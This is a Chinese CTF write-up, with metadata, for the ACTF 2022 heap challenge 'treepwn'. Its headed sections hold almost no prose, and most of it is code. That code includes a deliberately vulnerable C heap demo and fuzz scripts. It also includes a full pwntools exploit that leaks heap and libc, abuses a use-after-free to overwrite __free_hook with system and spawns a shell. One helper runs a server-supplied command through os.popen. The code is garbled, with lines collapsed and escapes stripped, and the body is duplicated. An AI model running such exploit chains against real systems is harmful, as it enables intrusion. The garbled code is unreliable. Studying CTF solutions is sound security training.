---
title: 【ACTF2022】从 Fuzz 到 XCTF 赛题
contest: ACTF
year: 2022
difficulty: medium
vuln_type: heap_exploit
tags:
- Fuzz
- randint-random-op
- demo-ptmalloc2
- fmt-string
- key_free-arbitrary-free
- write_in-arbitrary-write
- 2D-coord-tree
attack_chain: 堆题 Fuzz demo（add/delet/edit/show/leak/key_free/write_in/exit 7 个功能）/Fuzz 脚本 0x1000 轮每 10 轮 add 每 2 轮 delet 每 3 轮 show 检查 x55/x56 指针前缀/XCTF 赛题 treepwn 2D 坐标二叉树 add/edit/delet/show/query/批量 delet(i,j) 9x9 触发后 add(66,66,'nameless') + delet(3,6) + edit(3,6,p64(free_hook)) + add(3,6,'/bin/sh\x00') + add(6,6,p64(system)) + delet(3,6) 收壳
key_payload: 9x9 批量 delet + add(66,66,'nameless') 触发 nameless 链表 → UAF → __free_hook=system
one_liner: ACTF 2022 Nameless_a 经验分享，从 Fuzz demo 入门到 XCTF treepwn 实战的二维坐标 UAF。
lesson: Fuzz 是发现 heap 漏洞模式的有效手段；randint 随机操作 + 检查残留指针前缀可快速发现 UAF；2D 坐标二叉树用 (x,y) 双重索引，批量删除后存在悬挂指针触发 UAF。
quality: high
full_path: 【ACTF2022】从Fuzz到XCTF赛题.full.md
meta_path: 【ACTF2022】从Fuzz到XCTF赛题.meta.md
images_removed: true
images_removed_count: 10
schema_version: v3.0.0-P0
summary: 【ACTF2022】从 Fuzz 到 XCTF 赛题。ACTF 2022 Nameless_a 经验分享，从 Fuzz demo 入门到 XCTF treepwn 实战的二维坐标 UAF。。经验：Fuzz 是发现 heap 漏洞模式的有效手段；randint 随机操作 + 检查残留指针前缀可快速发现 UAF；2D ...
category: pwn
subcategory: heap_exploitation
time_required: medium
difficulty_score: 3
code_blocks_count: 1
images_count: 10
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/62611.html
reasoning_chain:
- Fuzz demo → 8 菜单 add/delet/edit/show/leak/key_free/write_in/exit → 触发点：暴露多种 heap 接口
- 假设：Fuzz 脚本 0x1000 轮随机操作 → 动作：randint 调度 add/delet/show 检查指针前缀
- 观察：x55/x56 指针前缀发现 UAF → 定位漏洞模式
- XCTF treepwn → 2D 坐标二叉树 add/edit/delet/show/query → 触发点：批量 delet(i,j) 9x9 触发后未清节点
- 假设：nameless 链表悬挂指针 → 动作：add(66,66,'nameless') + delet(3,6) + edit(3,6,p64(free_hook))
- 观察：悬挂指针 → add(6,6,p64(system)) + delet(3,6) → system('/bin/sh') 弹 shell
failed_attempts:
- 试图用 single delet 发现 UAF → 失败：必须批量删除触发 nameless
- 试图直接覆盖 __free_hook → 失败：要先 leak libc
key_observations:
- Fuzz 是发现 heap 漏洞模式的有效手段
- randint 随机操作 + 检查残留指针前缀可快速发现 UAF
- 2D 坐标二叉树用 (x,y) 双重索引
- 批量删除后存在悬挂指针触发 UAF 是经典套路
prerequisites:
- ptmalloc2 heap chunk 结构
- Fuzz 脚本编写（Python threading + randint）
- UAF / dangling pointer 攻击链
- __free_hook + system 一键 RCE
---
# 【ACTF2022】从Fuzz到XCTF赛题

> 原文: https://www.ctfiot.com/62611.html
> ID: 62611

一

前言

二

什么是Fuzz

三

堆题Fuzz

#include<stdlib.h>#include<stdio.h>#include<string.h> #define N 1000 char* note[N]; void init(){ setbuf(stdin, 0); setbuf(stdout, 0); setbuf(stderr, 0);} void menu(){ puts("1.add"); puts("2.delet"); puts("3.edit"); puts("4.show"); puts("5.leak"); puts("6.free"); puts("7.write"); puts("8.exit");} void add(){ int sz,idx; puts("size:"); scanf("%d",&sz); puts("idx:"); scanf("%d",&idx); note[idx]=(char *)malloc(sz);} void delet(){ int idx; puts("idx:"); scanf("%d",&idx); free(note[idx]);} void edit(){ int idx,sz; puts("size:"); scanf("%d",&sz); puts("idx:"); scanf("%d",&idx); puts(">>"); read(0,note[idx],sz);} void show(){ int idx; puts("idx:"); scanf("%d",&idx); printf(">>: %s",note[idx]); } void leak(){ char buf[100]; puts("input:"); scanf("%s",buf); printf(buf);} void key_free(){ char* p[1]; puts(">> "); read(0,p,0x8); free((char*)p[0]);} void write_in(){ char* p[1]; int sz; puts(">> "); read(0,p,0x8); puts(">> "); scanf("%d",&sz); puts(">> "); read(0,(char*)p[0],sz); } int main(){ int x; puts("welcome to use my demo"); puts("it will help you know sth about ptmalloc2"); init(); while(1){ menu(); puts(">> "); scanf("%d",&x); if(x==1){ add(); } else if(x==2){ delet(); } else if(x==3){ edit(); } else if(x==4){ show(); } else if (x==5){ leak(); } else if (x==6){ key_free(); } else if (x==7){ write_in(); } else if (x==8){ exit(0); } else{ return 0; } }}

def fuzz(): f=open('log.txt','w') for i in range(0,0x1000): if i % 10 == 0: idx=randint(0,0x10) add(idx,0x20) f.write('add({},0x20)'.format(idx)+'n') elif i % 2 == 0 : idx=randint(0,0x10) delet(idx) f.write('delt({})'.format(idx)+'n') elif i % 3 == 0 : idx=randint(0,0x10) show(idx) r.recvuntil('>>: ') check_char=r.recv(1) if check_char == 'x55' or check_char == 'x56': f.write('show({})'.format(idx)+'n') break f.close()

四

题解

def fuzz(): f=open('./log.txt','w') for i in range(0x1000): if(i%10==0): a = randint(0,8) b = randint(0,8) add(a,b,str(i)) data0=r.recvuntil('Choice Table') if 'two many' in data0: break f.write(' add({},{},str({}))n'.format(a,b,i)) elif(i%2==0): a = randint(0,8) b = randint(0,8) delet(a,b) data0=r.recvline() if 'not exists' in data0: continue f.write(' delet({},{})n'.format(a,b)) else: continue a = randint(0,8) b = randint(0,8) c = randint(0,8) d = randint(0,8) query(a,b,c,d) data0=r.recvuntil('Choice Table') if 'totally 0 elements' in data0: continue elif 'x55' in data0: f.write(' query({},{},{},{})n'.format(a,b,c,d)) ##f. break elif 'x56' in data0: f.write(' query({},{},{},{})n'.format(a,b,c,d)) break f.close()

from pwn import *from hashlib import sha256import osimport base64context.log_level='debug'#context.arch = 'amd64'context.arch = 'amd64'context.os = 'linux'def proof_of_work(sh): sh.recvuntil(" == ") cipher = sh.recvline().strip().decode("utf8") proof = mbruteforce(lambda x: sha256((x).encode()).hexdigest() == cipher, string.ascii_letters + string.digits, length=4, method='fixed') sh.sendlineafter("input your ????>", proof)##r=remote("123.57.69.203",7010)##r=process('./sp1',env={"LD_PRELODA":"./libc-2.27.so"}) def proofOfWork(): r.recvuntil('Submit the token generated by `') command = r.recvuntil('`',drop=True) r.sendline(os.popen(command).read()) def z(): gdb.attach(r) def cho(num): r.sendlineafter('> ',str(num)) def add(x,y,name): cho(0) r.sendlineafter("value: ",str(x)) r.sendlineafter("value: ",str(y)) r.sendafter("new element name: ",name.ljust(0x20,'x00')) def delet(x,y): cho(1) r.sendlineafter("want element x-coordinate value: ",str(x)) r.sendlineafter("want element y-coordinate value: ",str(y)) def edit(x,y,name): cho(2) r.sendlineafter("want element x-coordinate value: ",str(x)) r.sendlineafter("want element y-coordinate value: ",str(y)) r.sendafter("name: ",name.ljust(0x20,'x00')) def show(x,y): cho(3) r.sendlineafter('value',str(x)) r.sendlineafter('value',str(y)) def query(a,b,c,d): cho(4) r.sendlineafter("value: ",str(a)) r.sendlineafter("value: ",str(b)) r.sendlineafter("value: ",str(c)) r.sendlineafter("value: ",str(d)) def fuzz(): f=open('./log.txt','w') for i in range(0x1000): if(i%10==0): a = randint(0,8) b = randint(0,8) add(a,b,str(i)) data0=r.recvuntil('Choice Table') if 'two many' in data0: break f.write(' add({},{},str({}))n'.format(a,b,i)) elif(i%2==0): a = randint(0,8) b = randint(0,8) delet(a,b) data0=r.recvline() if 'not exists' in data0: continue f.write(' delet({},{})n'.format(a,b)) else: continue a = randint(0,8) b = randint(0,8) c = randint(0,8) d = randint(0,8) query(a,b,c,d) data0=r.recvuntil('Choice Table') if 'totally 0 elements' in data0: continue elif 'x55' in data0: f.write(' query({},{},{},{})n'.format(a,b,c,d)) ##f. break elif 'x56' in data0: f.write(' query({},{},{},{})n'.format(a,b,c,d)) break f.close() def leak_heap(): global heap add(1,0,str(0)) add(1,8,str(5)) add(5,6,str(10)) add(1,8,str(15)) add(8,3,str(20)) delet(8,3) add(8,7,str(25)) add(4,0,str(30)) add(2,6,str(35)) add(6,1,str(40)) add(1,6,str(45)) add(3,7,str(50)) add(8,4,str(55)) delet(3,7) add(0,5,str(60)) add(4,3,str(65)) add(8,0,str(70)) add(1,8,str(75)) add(1,3,str(80)) add(1,6,str(85)) add(8,6,str(90)) add(7,2,str(95)) delet(0,5) delet(7,2) add(7,6,str(100)) add(8,7,str(105)) delet(8,7) add(2,4,str(110)) add(3,0,str(115)) delet(4,3) add(3,1,str(120)) delet(8,6) add(7,8,str(125)) delet(7,8) add(7,0,str(130)) delet(8,7) add(7,6,str(135)) add(4,4,str(140)) delet(1,6) add(0,4,str(145)) add(7,8,str(150)) add(4,8,str(155)) delet(3,1) add(6,1,str(160)) add(8,0,str(165)) add(3,4,str(170)) delet(7,8) add(7,4,str(175)) delet(4,8) delet(1,8) add(4,5,str(180)) delet(3,0) add(8,8,str(185)) delet(6,1) add(7,6,str(190)) delet(8,0) add(7,3,str(195)) delet(8,0) add(0,2,str(200)) add(5,1,str(205)) add(5,0,str(210)) add(8,7,str(215)) delet(2,4) ##z() query(1,0,5,5) ##string=r.recvuntil('x55')[:-6] heap=u64(r.recvuntil('x55')[-6:].ljust(8,'x00'))-0x10 log.success('heap:'+str(hex(heap))) def uaf(): ##change(1,8)'s size to send it to unsorted bin add(3,6,str(0)) add(2,0,str(10)) delet(0,4) delet(8,7) add(3,2,str(20)) add(6,6,str(30)) delet(8,8) delet(0,2) add(0,3,str(40)) delet(3,6) delet(5,6) add(1,8,str(50)) delet(7,0) add(8,8,str(60)) add(0,4,str(70)) delet(3,4) add(6,1,str(80)) add(7,5,str(90)) ##z() ##delet(1,8) ##delet(7,5) ##delet(0,4) ##heap+0x8a8 delet(8,8) delet(2,0) ##z() edit(2,0,p64(heap+0x8a0)) add(2,0,'nameless') add(8,8,p64(0)+p64(0x551)) ##z() ##z() add(4,6,str(0)) delet(8,8) add(6,7,str(10)) ##delet(3,6) ##delet(3,6) ##leak_libc delet(1,8) ##z() show(1,8) r.recvuntil('found!!! its name: ') libcbase=u64(r.recvuntil('x7f').ljust(8,'x00'))-0x3ebca0 log.success('libcbase:'+hex(libcbase)) ''' f=open('log.txt','w') for i in range(0,9): for j in range(0,9): if(i==1 and j==8):
continue delet(i,j) f.write(str(i)+" "+str(j)+'n') f.close() ''' ##set_libc_func free_hook=libcbase+libc.sym['__free_hook'] system=libcbase+libc.sym['system'] ##one=[0x4f2a5,0x4f302,0x10a2fc] ##onegadget=libcbase+one[0] f=open('log.txt','w') for i in range(0,9): for j in range(0,9): if(i==1 and j==8) : continue if(i==3 and j==6) : continue delet(i,j) f.write(str(i)+" "+str(j)+'n') f.close() ##delet(3,6) ##delet(3,6) ## get_shell ##z() ##delet(6,1) ##delet(4,0) add(66,66,'nameless') delet(3,6) ##z() edit(3,6,p64(free_hook)) add(3,6,'/bin/shx00') ##z() log.success('system:'+str(hex(system))) ##z() add(6,6,p64(system)) delet(3,6) ##z() ##delet(3,6) ##delet(3,6) ##delet(1,7) ##z() ##add(66,66,'nameless') ##z() ##fuzz() ##z() ##delet(4,0) ##delet(4,0) ##delet(4,0) def exp(): global r global libc r=remote("121.36.241.104",9999) proofOfWork() ##r=process('./treepwn') libc=ELF('./libc-2.27.so') ##fuzz() leak_heap() uaf() r.interactive() if __name__ == '__main__': exp()

看雪ID：Nameless_a

https://bbs.pediy.com/user-home-943085.htm

*本文由看雪论坛 Nameless_a 原创，转载请注明来自看雪社区

# 往期推荐

1.进程 Dump & PE unpacking & IAT 修复 – Windows 篇

2.NtSocket的稳定实现，Client与Server的简单封装，以及SocketAsyncSelect的一种APC实现

3.如何保护自己的代码？给自己的代码添加NoChange属性

4.针对某会议软件，简单研究其CEF框架

5.PE加载过程 FileBuffer-ImageBuffer

6.APT 双尾蝎样本分析

球分享

球点赞

球在看

点击“阅读原文”，了解更多！


```
一
前言
二
什么是Fuzz
三
堆题Fuzz
    #include<stdlib.h>#include<stdio.h>#include<string.h> #define N 1000 char* note[N]; void init(){ setbuf(stdin, 0); setbuf(stdout, 0); setbuf(stderr, 0);} void menu(){ puts("1.add"); puts("2.delet"); puts("3.edit"); puts("4.show"); puts("5.leak"); puts("6.free"); puts("7.write"); puts("8.exit");} void add(){ int sz,idx; puts("size:"); scanf("%d",&sz); puts("idx:"); scanf("%d",&idx); note[idx]=(char *)malloc(sz);} void delet(){ int idx; puts("idx:"); scanf("%d",&idx); free(note[idx]);} void edit(){ int idx,sz; puts("size:"); scanf("%d",&sz); puts("idx:"); scanf("%d",&idx); puts(">>"); read(0,note[idx],sz);} void show(){ int idx; puts("idx:"); scanf("%d",&idx); printf(">>: %s",note[idx]); } void leak(){ char buf[100]; puts("input:"); scanf("%s",buf); printf(buf);} void key_free(){ char* p[1]; puts(">> "); read(0,p,0x8); free((char*)p[0]);} void write_in(){ char* p[1]; int sz; puts(">> "); read(0,p,0x8); puts(">> "); scanf("%d",&sz); puts(">> "); read(0,(char*)p[0],sz); } int main(){ int x; puts("welcome to use my demo"); puts("it will help you know sth about ptmalloc2"); init(); while(1){ menu(); puts(">> "); scanf("%d",&x); if(x==1){ add(); } else if(x==2){ delet(); } else if(x==3){ edit(); } else if(x==4){ show(); } else if (x==5){ leak(); } else if (x==6){ key_free(); } else if (x==7){ write_in(); } else if (x==8){ exit(0); } else{ return 0; } }}
def fuzz(): f=open('log.txt','w') for i in range(0,0x1000): if i % 10 == 0: idx=randint(0,0x10) add(idx,0x20) f.write('add({},0x20)'.format(idx)+'n') elif i % 2 == 0 : idx=randint(0,0x10) delet(idx) f.write('delt({})'.format(idx)+'n') elif i % 3 == 0 : idx=randint(0,0x10) show(idx) r.recvuntil('>>: ') check_char=r.recv(1) if check_char == 'x55' or check_char == 'x56': f.write('show({})'.format(idx)+'n') break f.close()
四
题解
def fuzz(): f=open('./log.txt','w') for i in range(0x1000): if(i%10==0): a = randint(0,8) b = randint(0,8) add(a,b,str(i)) data0=r.recvuntil('Choice Table') if 'two many' in data0: break f.write(' add({},{},str({}))n'.format(a,b,i)) elif(i%2==0): a = randint(0,8) b = randint(0,8) delet(a,b) data0=r.recvline() if 'not exists' in data0: continue f.write(' delet({},{})n'.format(a,b)) else: continue a = randint(0,8) b = randint(0,8) c = randint(0,8) d = randint(0,8) query(a,b,c,d) data0=r.recvuntil('Choice Table') if 'totally 0 elements' in data0: continue elif 'x55' in data0: f.write(' query({},{},{},{})n'.format(a,b,c,d)) ##f. break elif 'x56' in data0: f.write(' query({},{},{},{})n'.format(a,b,c,d)) break f.close()
from pwn import *from hashlib import sha256import osimport base64context.log_level='debug'#context.arch = 'amd64'context.arch = 'amd64'context.os = 'linux'def proof_of_work(sh): sh.recvuntil(" == ") cipher = sh.recvline().strip().decode("utf8") proof = mbruteforce(lambda x: sha256((x).encode()).hexdigest() == cipher, string.ascii_letters + string.digits, length=4, method='fixed') sh.sendlineafter("input your ????>", proof)##r=remote("123.57.69.203",7010)##r=process('./sp1',env={"LD_PRELODA":"./libc-2.27.so"}) def proofOfWork(): r.recvuntil('Submit the token generated by `') command = r.recvuntil('`',drop=True) r.sendline(os.popen(command).read()) def z(): gdb.attach(r) def cho(num): r.sendlineafter('> ',str(num)) def add(x,y,name): cho(0) r.sendlineafter("value: ",str(x)) r.sendlineafter("value: ",str(y)) r.sendafter("new element name: ",name.ljust(0x20,'x00')) def delet(x,y): cho(1) r.sendlineafter("want element x-coordinate value: ",str(x)) r.sendlineafter("want element y-coordinate value: ",str(y)) def edit(x,y,name): cho(2) r.sendlineafter("want element x-coordinate value: ",str(x)) r.sendlineafter("want element y-coordinate value: ",str(y)) r.sendafter("name: ",name.ljust(0x20,'x00')) def show(x,y): cho(3) r.sendlineafter('value',str(x)) r.sendlineafter('value',str(y)) def query(a,b,c,d): cho(4) r.sendlineafter("value: ",str(a)) r.sendlineafter("value: ",str(b)) r.sendlineafter("value: ",str(c)) r.sendlineafter("value: ",str(d)) def fuzz(): f=open('./log.txt','w') for i in range(0x1000): if(i%10==0): a = randint(0,8) b = randint(0,8) add(a,b,str(i)) data0=r.recvuntil('Choice Table') if 'two many' in data0: break f.write(' add({},{},str({}))n'.format(a,b,i)) elif(i%2==0): a = randint(0,8) b = randint(0,8) delet(a,b) data0=r.recvline() if 'not exists' in data0: continue f.write(' delet({},{})n'.format(a,b)) else: continue a = randint(0,8) b = randint(0,8) c = randint(0,8) d = randint(0,8) query(a,b,c,d) data0=r.recvuntil('Choice Table') if 'totally 0 elements' in data0: continue elif 'x55' in data0: f.write(' query({},{},{},{})n'.format(a,b,c,d)) ##f. break elif 'x56' in data0: f.write(' query({},{},{},{})n'.format(a,b,c,d)) break f.close() def leak_heap(): global heap add(1,0,str(0)) add(1,8,str(5)) add(5,6,str(10)) add(1,8,str(15)) add(8,3,str(20)) delet(8,3) add(8,7,str(25)) add(4,0,str(30)) add(2,6,str(35)) add(6,1,str(40)) add(1,6,str(45)) add(3,7,str(50)) add(8,4,str(55)) delet(3,7) add(0,5,str(60)) add(4,3,str(65)) add(8,0,str(70)) add(1,8,str(75)) add(1,3,str(80)) add(1,6,str(85)) add(8,6,str(90)) add(7,2,str(95)) delet(0,5) delet(7,2) add(7,6,str(100)) add(8,7,str(105)) delet(8,7) add(2,4,str(110)) add(3,0,str(115)) delet(4,3) add(3,1,str(120)) delet(8,6) add(7,8,str(125)) delet(7,8) add(7,0,str(130)) delet(8,7) add(7,6,str(135)) add(4,4,str(140)) delet(1,6) add(0,4,str(145)) add(7,8,str(150)) add(4,8,str(155)) delet(3,1) add(6,1,str(160)) add(8,0,str(165)) add(3,4,str(170)) delet(7,8) add(7,4,str(175)) delet(4,8) delet(1,8) add(4,5,str(180)) delet(3,0) add(8,8,str(185)) delet(6,1) add(7,6,str(190)) delet(8,0) add(7,3,str(195)) delet(8,0) add(0,2,str(200)) add(5,1,str(205)) add(5,0,str(210)) add(8,7,str(215)) delet(2,4) ##z() query(1,0,5,5) ##string=r.recvuntil('x55')[:-6] heap=u64(r.recvuntil('x55')[-6:].ljust(8,'x00'))-0x10 log.success('heap:'+str(hex(heap))) def uaf(): ##change(1,8)'s size to send it to unsorted bin add(3,6,str(0)) add(2,0,str(10)) delet(0,4) delet(8,7) add(3,2,str(20)) add(6,6,str(30)) delet(8,8) delet(0,2) add(0,3,str(40)) delet(3,6) delet(5,6) add(1,8,str(50)) delet(7,0) add(8,8,str(60)) add(0,4,str(70)) delet(3,4) add(6,1,str(80)) add(7,5,str(90)) ##z() ##delet(1,8) ##delet(7,5) ##delet(0,4) ##heap+0x8a8 delet(8,8) delet(2,0) ##z() edit(2,0,p64(heap+0x8a0)) add(2,0,'nameless') add(8,8,p64(0)+p64(0x551)) ##z() ##z() add(4,6,str(0)) delet(8,8) add(6,7,str(10)) ##delet(3,6) ##delet(3,6) ##leak_libc delet(1,8) ##z() show(1,8) r.recvuntil('found!!! its name: ') libcbase=u64(r.recvuntil('x7f').ljust(8,'x00'))-0x3ebca0 log.success('libcbase:'+hex(libcbase)) ''' f=open('log.txt','w') for i in range(0,9): for j in range(0,9): if(i==1 and j==8):
continue delet(i,j) f.write(str(i)+" "+str(j)+'n') f.close() ''' ##set_libc_func free_hook=libcbase+libc.sym['__free_hook'] system=libcbase+libc.sym['system'] ##one=[0x4f2a5,0x4f302,0x10a2fc] ##onegadget=libcbase+one[0] f=open('log.txt','w') for i in range(0,9): for j in range(0,9): if(i==1 and j==8) : continue if(i==3 and j==6) : continue delet(i,j) f.write(str(i)+" "+str(j)+'n') f.close() ##delet(3,6) ##delet(3,6) ## get_shell ##z() ##delet(6,1) ##delet(4,0) add(66,66,'nameless') delet(3,6) ##z() edit(3,6,p64(free_hook)) add(3,6,'/bin/shx00') ##z() log.success('system:'+str(hex(system))) ##z() add(6,6,p64(system)) delet(3,6) ##z() ##delet(3,6) ##delet(3,6) ##delet(1,7) ##z() ##add(66,66,'nameless') ##z() ##fuzz() ##z() ##delet(4,0) ##delet(4,0) ##delet(4,0) def exp(): global r global libc r=remote("121.36.241.104",9999) proofOfWork() ##r=process('./treepwn') libc=ELF('./libc-2.27.so') ##fuzz() leak_heap() uaf() r.interactive() if __name__ == '__main__': exp()
```


---
## 附图

[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]